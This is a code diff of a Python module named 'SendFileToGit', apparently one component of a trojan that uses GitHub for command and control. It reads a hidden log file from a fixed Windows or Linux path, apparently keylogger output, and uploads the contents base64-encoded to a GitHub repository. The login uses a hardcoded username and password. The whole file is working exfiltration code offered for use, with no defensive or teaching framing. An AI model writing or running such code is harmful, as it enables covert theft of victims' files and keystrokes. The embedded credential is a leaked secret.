@@ -3,32 +3,11 @@ import json
 import base64
 import os
 
-path = "others/"
-filePath = "Tapalog.log"#base64.b64encode("Tapalog.log")
-TargetWinFilePath = "C:\\Users\\this-PC\\Desktop\\work\\Tapalog.log"
-TargetLinuxFilePath = "/root/Desktop/user"
-
-def getOSPath():
-	if os.name == 'posix':
-		return TargetLinuxFilePath
-	elif os.name == 'nt':
-		return TargetWinFilePath
-	else :
-		return str("OS not recognized!")
-
-def run(**args):
-	print("[*] In SendFileToGit module.") #Todelete
-	try:
-		TargetOSfilePath = getOSPath()
-		fich = open(TargetOSfilePath, "r")
-		content = fich.read()
-		fich.close()
-		#store_module_result(content)
-		return str(content)
-	except:
-		return "SendFileToGit: File %s not found"% TargetOSfilePath
-
-
+#path = "others/"
+filePath = ".Tlog.log"#base64.b64encode("Tapalog.log")
+TargetWinFilePath = "C:\\Users\\this-PC\\Desktop\\work\\.Tlog.log"
+TargetLinuxFilePath = ".Tlog.log"
+TargetOSfilePath=""
 
 def connect_to_github():
 	gh = login(username="MarvenGarsalli",password="1'mfor1am")
@@ -38,6 +17,27 @@ def connect_to_github():
 
 def store_module_result(data):
 	gh,repo,branch = connect_to_github()
-	remote_path= path+"sendFileToGit/"+filePath
-	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data))
+	remote_path= "data/abc/sendFileToGit/"+filePath
+	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data.encode()))
 	return
+
+def run(**args):
+	print("[*] In SendFileToGit module.") #Todelete
+	global TargetOSfilePath
+	try:
+		if os.name == 'posix':
+			TargetOSfilePath= TargetLinuxFilePath
+		elif os.name == 'nt':
+			TargetOSfilePath= TargetWinFilePath
+		else :
+			return str("OS not recognized!")
+
+		fich = open(TargetOSfilePath, "r")
+		content = fich.read()
+		fich.close()
+		#store_module_result(str(content))
+		return str(content)
+	except:
+		return "SendFileToGit: File %s not found"% TargetOSfilePath
+
+run()
